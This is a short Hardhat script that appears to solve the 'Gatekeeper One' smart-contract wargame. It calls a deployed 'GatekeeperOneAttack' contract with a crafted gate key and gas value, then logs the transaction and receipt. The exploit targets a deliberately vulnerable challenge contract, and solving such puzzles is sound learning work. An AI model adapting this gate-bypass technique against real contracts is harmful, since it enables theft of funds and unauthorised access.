const { ethers } = require("hardhat");

const ATTACKER_ADDRESS = "0x593c11c32650BE928D20D3F928B4344cd8c3a5cf";
const KEY = "0x00000100000035c7";
const GAS_AMOUNT = 256;

async function main() {
    const gatekeeperOneAttacker = await ethers.getContractAt("GatekeeperOneAttack", ATTACKER_ADDRESS);
    
    // Execute the attack transaction.
    const attackTx = await gatekeeperOneAttacker.attack(KEY, GAS_AMOUNT);
    const txReceipt = await attackTx.wait();
    console.log("tx: ", attackTx);
    console.log("rec: ", txReceipt);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});